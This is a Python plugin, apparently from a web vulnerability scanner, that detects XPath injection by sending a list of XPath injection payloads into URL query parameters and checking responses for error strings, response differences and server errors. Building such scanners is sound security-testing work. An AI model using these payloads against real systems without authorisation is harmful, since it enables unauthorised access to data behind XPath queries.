"""
XPath Injection Detection Plugin v6.0.

Tests for XPath injection by injecting XPath syntax breakers
and boolean logic into query parameters.

CWE-643 | CVSS 7.5 | OWASP A03:2021 Injection
"""

from core.http_client import get
from core.response_analyzer import (
    get_baseline, diff_responses, detect_waf_block,
    calculate_confidence, make_finding,
)
from core.utils import inject_into_params

PLUGIN_CWE = 643
PLUGIN_CVSS = 7.5
PLUGIN_OWASP = "A03:2021 Injection"

XPATH_PAYLOADS = [
    "' or '1'='1",
    "' or ''='",
    "1' or '1'='1' or '1'='1",
    "'] | //* | //*['",
    "' and count(/*)>0 or '1'='1",
    "1 or 1=1",
    "' or 1=1 or ''='",
]

XPATH_ERRORS = [
    "xpath", "xmldomerror", "xmlerror", "invalid expression",
    "invalid predicate", "unregistered function", "xpatherror",
    "javax.xml.xpath", "libxml2", "simplexml",
    "xmlsyntaxerror", "lxml.etree", "expected token",
    "dom exception", "unterminated string literal",
]


def test_xpath_injection(url):
    """Test for XPath injection in query parameters."""
    try:
        baseline = get_baseline(url, get)
        baseline_text = baseline.get("text_lower", "")

        for payload in XPATH_PAYLOADS:
            for param_name, crafted_url in inject_into_params(url, payload):
                try:
                    r = get(crafted_url)
                    if r is None:
                        continue
                    blocked, _ = detect_waf_block(r)
                    if blocked:
                        continue

                    body_lower = r.text.lower()
                    signals = {}

                    # Check for XPath errors
                    errors_found = []
                    for err in XPATH_ERRORS:
                        if err in body_lower and err not in baseline_text:
                            errors_found.append(err)

                    if errors_found:
                        signals["error_string"] = True
                        signals["xpath_error"] = True

                    # Response diff
                    sim = diff_responses(baseline.get("text", ""), r.text)
                    if sim < 0.80:
                        signals["response_diff"] = True

                    # Status change
                    if r.status_code >= 500 and baseline.get("status_code", 200) < 500:
                        signals["status_change"] = True

                    if signals:
                        confidence = calculate_confidence(signals)
                        finding = make_finding(
                            url, "XPath Injection",
                            confidence=confidence, signals=signals,
                            details=f"XPath injection detected via parameter '{param_name}'",
                            severity="High", payload=payload,
                            evidence=f"XPath errors: {', '.join(errors_found)}" if errors_found else f"Response diff: {sim:.2f}",
                            parameter=param_name,
                        )
                        if finding:
                            finding["cwe"] = PLUGIN_CWE
                            finding["cvss"] = PLUGIN_CVSS
                            finding["owasp"] = PLUGIN_OWASP
                            return finding

                except Exception:
                    continue

    except Exception:
        pass
    return None
